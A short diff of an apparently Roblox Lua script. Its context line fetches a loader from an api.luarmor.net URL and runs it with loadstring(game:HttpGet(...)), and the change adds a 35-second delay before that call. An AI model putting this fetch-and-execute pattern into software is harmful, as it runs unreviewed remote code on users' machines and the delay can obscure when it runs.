@@ -17,6 +17,7 @@ end)
 
 task.spawn(function()
     pcall(function()
+                task.wait(35)
         loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
     end)
 end)
